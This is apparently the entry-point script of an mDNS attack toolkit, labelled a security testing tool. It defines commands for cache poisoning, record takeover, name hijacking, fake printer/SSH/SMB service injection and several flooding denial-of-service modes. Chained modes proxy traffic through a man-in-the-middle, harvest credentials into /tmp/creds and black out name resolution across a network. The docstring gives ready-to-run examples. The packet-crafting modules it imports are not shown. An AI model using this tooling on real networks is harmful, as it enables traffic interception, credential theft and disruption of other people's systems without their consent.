#!/usr/bin/env python3
"""
mdns_toolkit.py - mDNS security testing toolkit.

Usage:
    ./mdns_toolkit.py <attack> [options]

Attacks:
    recon           Passive network reconnaissance (zero packets sent)
    poison          Cache poisoning via unsolicited responses
    flush           Cache-flush bit record takeover (single packet)
    goodbye         Goodbye packet abuse (forced cache eviction)
    hijack          Name hijacking via conflict resolution gaming
    service-poison  Fake service injection (printers, AirPlay, SSH, etc.)
    probe-dos       Probe suppression / registration denial
    tc-flood        TC-bit flood (suppress ALL mDNS responses)
    suppress        Duplicate answer suppression / POOF eviction

Examples:
    # Passive recon for 60 seconds
    ./mdns_toolkit.py recon --duration 60

    # Poison: make victim.local resolve to attacker IP
    ./mdns_toolkit.py poison --name victim.local. --ip 172.20.0.99

    # Cache-flush takeover of a hostname
    ./mdns_toolkit.py flush --name target.local. --ip 172.20.0.99

    # Goodbye + replace a record
    ./mdns_toolkit.py goodbye --name target.local. --current-ip 172.20.0.2 --new-ip 172.20.0.99

    # Steal a hostname via conflict resolution
    ./mdns_toolkit.py hijack --name victim.local. --ip 172.20.0.250

    # Advertise a fake printer
    ./mdns_toolkit.py service-poison --template printer --hostname evil --ip 172.20.0.99

    # Block all new mDNS registrations
    ./mdns_toolkit.py probe-dos --ip 172.20.0.250

    # Suppress all mDNS responses network-wide
    ./mdns_toolkit.py tc-flood --duration 30

    # Silence a legitimate responder and replace its answers
    ./mdns_toolkit.py suppress --name target.local. --ip 172.20.0.99 --real-ip 172.20.0.2
"""

import argparse
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


def cmd_recon(args):
    from attacks.recon import run
    run(iface=args.iface, duration=args.duration, quiet=args.quiet)


def cmd_poison(args):
    from attacks.poison import run
    run(name=args.name, ip=args.ip, mode=args.mode, iface=args.iface,
        ttl=args.ttl, interval=args.interval, cache_flush=not args.no_flush)


def cmd_flush(args):
    from attacks.flush import run
    run(name=args.name, ip=args.ip, iface=args.iface, ttl=args.ttl,
        service_name=args.service_name, port=args.port, txt=args.txt)


def cmd_goodbye(args):
    from attacks.goodbye import run
    run(name=args.name, current_ip=args.current_ip, iface=args.iface,
        new_ip=args.new_ip, flood=args.flood, count=args.count)


def cmd_hijack(args):
    from attacks.hijack import run
    run(name=args.name, ip=args.ip, mode=args.mode, iface=args.iface,
        duration=args.duration)


def cmd_service_poison(args):
    from attacks.service_poison import run
    run(ip=args.ip, hostname=args.hostname, template=args.template,
        service_type=args.service_type, instance_name=args.instance,
        port=args.port, iface=args.iface, mass=args.mass,
        duration=args.duration)


def cmd_probe_dos(args):
    from attacks.probe_dos import run
    run(our_ip=args.ip, target=args.target, iface=args.iface,
        duration=args.duration)


def cmd_tc_flood(args):
    from attacks.tc_flood import run
    run(iface=args.iface, duration=args.duration, interval=args.interval)


def cmd_suppress(args):
    from attacks.suppress import run
    run(target_name=args.name, our_ip=args.ip, real_ip=args.real_ip,
        iface=args.iface, mode=args.mode, duration=args.duration)


def cmd_chain_a(args):
    from attacks.chains import chain_a
    chain_a(target_name=args.target, target_ip=args.target_ip, our_ip=args.ip,
            target_port=args.port, iface=args.iface, duration=args.duration,
            log_dir=args.log_dir)


def cmd_chain_b(args):
    from attacks.chains import chain_b
    services = args.services.split(",") if args.services else None
    chain_b(our_ip=args.ip, hostname=args.hostname, services=services,
            iface=args.iface, duration=args.duration, log_dir=args.log_dir)


def cmd_chain_c(args):
    from attacks.chains import chain_c
    chain_c(target_name=args.target, our_ip=args.ip, iface=args.iface,
            duration=args.duration, wait_for_sleep=not args.no_wait)


def cmd_chain_d(args):
    from attacks.chains import chain_d
    known = None
    if args.records:
        known = []
        for r in args.records.split(","):
            name, ip = r.strip().split("=")
            known.append((name.strip(), ip.strip()))
    chain_d(our_ip=args.ip, iface=args.iface, duration=args.duration,
            known_records=known)


def cmd_chain_e(args):
    from attacks.chains import chain_e
    domains = args.domains.split(",") if args.domains else None
    chain_e(our_ip=args.ip, domains=domains, iface=args.iface,
            duration=args.duration)


def main():
    parser = argparse.ArgumentParser(
        description="mDNS Security Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Examples:")[1] if "Examples:" in __doc__ else "")

    sub = parser.add_subparsers(dest="command", help="Attack to run")

    # ── recon ────────────────────────────────────────────────────────────
    p = sub.add_parser("recon", help="Passive mDNS reconnaissance")
    p.add_argument("--iface", help="Network interface")
    p.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    p.add_argument("--quiet", action="store_true", help="Suppress per-packet output")
    p.set_defaults(func=cmd_recon)

    # ── poison ───────────────────────────────────────────────────────────
    p = sub.add_parser("poison", help="Cache poisoning via unsolicited responses")
    p.add_argument("--name", required=True, help="Target name (e.g., victim.local.)")
    p.add_argument("--ip", required=True, help="IP to inject")
    p.add_argument("--mode", choices=["oneshot", "continuous", "reactive"],
                   default="oneshot", help="Poisoning mode")
    p.add_argument("--ttl", type=int, default=4500, help="TTL for poisoned record")
    p.add_argument("--interval", type=int, default=20, help="Re-announce interval (continuous mode)")
    p.add_argument("--no-flush", action="store_true", help="Don't set cache-flush bit")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_poison)

    # ── flush ────────────────────────────────────────────────────────────
    p = sub.add_parser("flush", help="Cache-flush bit record takeover")
    p.add_argument("--name", required=True, help="Hostname to take over (e.g., target.local.)")
    p.add_argument("--ip", required=True, help="Attacker IP")
    p.add_argument("--ttl", type=int, default=4500, help="TTL")
    p.add_argument("--service-name", help="Service FQDN for full service takeover")
    p.add_argument("--port", type=int, help="Port for service takeover")
    p.add_argument("--txt", help="TXT records as k=v,k=v")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_flush)

    # ── goodbye ──────────────────────────────────────────────────────────
    p = sub.add_parser("goodbye", help="Goodbye packet abuse")
    p.add_argument("--name", required=True, help="Target name")
    p.add_argument("--current-ip", required=True, help="Current IP of the target record")
    p.add_argument("--new-ip", help="Replacement IP (evict-and-replace mode)")
    p.add_argument("--flood", action="store_true", help="Flood mode (repeated goodbyes)")
    p.add_argument("--count", type=int, default=50, help="Number of goodbyes in flood mode")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_goodbye)

    # ── hijack ───────────────────────────────────────────────────────────
    p = sub.add_parser("hijack", help="Name hijacking via conflict resolution")
    p.add_argument("--name", required=True, help="Name to steal")
    p.add_argument("--ip", required=True, help="Attacker IP (must be lexicographically > victim)")
    p.add_argument("--mode", choices=["steal", "conflict", "exhaust"],
                   default="steal", help="Hijack mode")
    p.add_argument("--duration", type=int, default=60, help="Duration for exhaust mode")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_hijack)

    # ── service-poison ───────────────────────────────────────────────────
    p = sub.add_parser("service-poison", help="Fake service injection")
    p.add_argument("--ip", required=True, help="Attacker IP")
    p.add_argument("--hostname", required=True, help="Attacker hostname (without .local.)")
    p.add_argument("--template", choices=list(__import__("attacks.service_poison",
                   fromlist=["TEMPLATES"]).TEMPLATES.keys()),
                   help="Service template")
    p.add_argument("--service-type", help="Custom service type (e.g., _http._tcp)")
    p.add_argument("--instance", help="Service instance name")
    p.add_argument("--port", type=int, help="Service port")
    p.add_argument("--mass", action="store_true", help="Advertise ALL service types")
    p.add_argument("--duration", type=int, default=300, help="Duration in seconds")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_service_poison)

    # ── probe-dos ────────────────────────────────────────────────────────
    p = sub.add_parser("probe-dos", help="Probe suppression / registration denial")
    p.add_argument("--ip", required=True, help="Conflict IP (use high value to win tiebreaks)")
    p.add_argument("--target", help="Specific name to block (omit for all)")
    p.add_argument("--duration", type=int, default=120, help="Duration in seconds")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_probe_dos)

    # ── tc-flood ─────────────────────────────────────────────────────────
    p = sub.add_parser("tc-flood", help="TC-bit flood (suppress all responses)")
    p.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    p.add_argument("--interval", type=float, default=0.3, help="Packet interval in seconds")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_tc_flood)

    # ── suppress ─────────────────────────────────────────────────────────
    p = sub.add_parser("suppress", help="Duplicate answer suppression / POOF eviction")
    p.add_argument("--name", required=True, help="Target name")
    p.add_argument("--ip", required=True, help="Attacker IP to inject")
    p.add_argument("--real-ip", help="Real IP of the target (for suppress mode)")
    p.add_argument("--mode", choices=["suppress", "poof"], default="suppress")
    p.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_suppress)

    # ── chain-a ──────────────────────────────────────────────────────────
    p = sub.add_parser("chain-a", help="Chain A: Full Service MITM (recon->evict->proxy)")
    p.add_argument("--target", required=True, help="Target hostname (e.g., fileserver.local.)")
    p.add_argument("--target-ip", required=True, help="Target's real IP")
    p.add_argument("--ip", required=True, help="Attacker IP")
    p.add_argument("--port", type=int, default=80, help="Service port to proxy (default: 80)")
    p.add_argument("--duration", type=int, default=120, help="Duration in seconds")
    p.add_argument("--log-dir", default="/tmp/mitm", help="Directory for traffic logs")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_chain_a)

    # ── chain-b ──────────────────────────────────────────────────────────
    p = sub.add_parser("chain-b", help="Chain B: Credential harvesting via fake services")
    p.add_argument("--ip", required=True, help="Attacker IP")
    p.add_argument("--hostname", default="services", help="Attacker hostname (default: services)")
    p.add_argument("--services", help="Comma-separated services: printer,http,smb,ssh (default: all)")
    p.add_argument("--duration", type=int, default=300, help="Duration in seconds")
    p.add_argument("--log-dir", default="/tmp/creds", help="Directory for captured credentials")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_chain_b)

    # ── chain-c ──────────────────────────────────────────────────────────
    p = sub.add_parser("chain-c", help="Chain C: Targeted stealth takeover (wait for sleep)")
    p.add_argument("--target", required=True, help="Target hostname to steal")
    p.add_argument("--ip", required=True, help="Attacker IP (must be > target IP lexicographically)")
    p.add_argument("--no-wait", action="store_true", help="Skip waiting for target to go offline")
    p.add_argument("--duration", type=int, default=300, help="Duration to hold the name")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_chain_c)

    # ── chain-d ──────────────────────────────────────────────────────────
    p = sub.add_parser("chain-d", help="Chain D: Network-wide mDNS denial (blackout)")
    p.add_argument("--ip", required=True, help="Conflict IP for probe denial")
    p.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    p.add_argument("--records", help="Known records to goodbye: name=ip,name=ip")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_chain_d)

    # ── chain-e ──────────────────────────────────────────────────────────
    p = sub.add_parser("chain-e", help="Chain E: Global name hijack (needs separate DNS disruption)")
    p.add_argument("--ip", required=True, help="Attacker IP to serve for global domains")
    p.add_argument("--domains", help="Comma-separated domains (default: common services)")
    p.add_argument("--duration", type=int, default=120, help="Duration in seconds")
    p.add_argument("--iface", help="Network interface")
    p.set_defaults(func=cmd_chain_e)

    # ── Parse and dispatch ───────────────────────────────────────────────
    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    print(f"╔══════════════════════════════════════════════════════════════╗")
    print(f"║              mDNS Security Testing Toolkit                  ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"  Attack: {args.command}")
    print()

    args.func(args)


if __name__ == "__main__":
    main()
